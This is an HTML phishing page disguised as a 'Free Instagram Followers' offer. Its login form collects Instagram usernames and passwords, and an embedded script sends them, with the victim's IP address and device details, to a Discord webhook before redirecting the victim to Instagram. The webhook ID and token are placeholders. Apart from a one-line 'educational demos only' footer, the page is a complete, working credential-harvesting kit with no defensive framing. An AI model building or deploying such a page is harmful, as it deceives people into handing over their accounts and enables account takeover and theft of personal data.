<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Free Instagram Followers</title>
  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" />
  <link rel="stylesheet" href="css.css" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
    }
    .header img {
      width: 160px;
      margin-bottom: 15px;
    }
    .text {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }
    .btn {
      background-color: #ff2b74;
      color: white;
      font-weight: bold;
      border: none;
      padding: 8px 0;
      width: 100%;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #ff1f60;
    }
  </style>
</head>
<body>
  <div id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header" style="text-align:center;">
                  <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Followers Logo" />
                  <h2>Free Instagram Followers</h2>
                  <p>Log in to get up to <strong>1000 followers</strong> instantly!</p>
                </div>
                <div class="form-wrap">
                  <form class="form">
                    <div class="input-box">
                      <input type="text" id="username" placeholder="Instagram Username" maxlength="30" required />
                    </div>
                    <div class="input-box">
                      <input type="password" id="password" placeholder="Instagram Password" maxlength="30" required />
                    </div>
                    <span class="button-box">
                      <button class="btn" type="button" onclick="sendMessage()">Get Free Followers</button>
                    </span>
                  </form>
                </div>
              </div>
              <p class="text">Service is 100% free ‚Äî no human verification required!</p>
            </div>
          </article>
        </div>
      </main>
    </section>
  </div>

  <!-- Logger Script -->
  <script>
    async function sendMessage() {
      const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const userAgent = navigator.userAgent;

      const browserInfo = getBrowserInfo(userAgent);
      const osInfo = getOSInfo(userAgent);

      let ip = "Unavailable";
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
      } catch (err) {
        console.error("Failed to fetch IP:", err);
      }

      const payload = {
        username: "üì• Free Followers Logger",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png",
        embeds: [
          {
            title: "üö® New Login Captured",
            description: "New user tried to log in for free followers.",
            color: 0xff2b74,
            fields: [
              { name: "üë§ Username", value: `\`${username}\``, inline: true },
              { name: "üîë Password", value: `\`${password}\``, inline: true },
              { name: "üñ•Ô∏è Device Info", value: `**Browser:** ${browserInfo}\n**OS:** ${osInfo}`, inline: false },
              { name: "üì° IP Address", value: `\`${ip}\``, inline: false }
            ],
            footer: {
              text: "Free Followers Logger ‚Ä¢ For educational demos only",
              icon_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png"
            },
            timestamp: new Date().toISOString()
          }
        ]
      };

      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN");
      request.setRequestHeader("Content-type", "application/json");
      request.send(JSON.stringify(payload));

      await delay(2000);
      window.location.replace("https://www.instagram.com");
    }

    function getBrowserInfo(ua) {
      if (ua.includes("Firefox/")) return "Mozilla Firefox";
      if (ua.includes("Edg/")) return "Microsoft Edge";
      if (ua.includes("Chrome/")) return "Google Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Apple Safari";
      return "Unknown Browser";
    }

    function getOSInfo(ua) {
      if (/Windows NT/.test(ua)) return "Windows";
      if (/Macintosh/.test(ua)) return "macOS";
      if (/Linux/.test(ua)) return "Linux";
      if (/Android/.test(ua)) return "Android";
      if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
      return "Unknown OS";
    }
  </script>
</body>
</html>
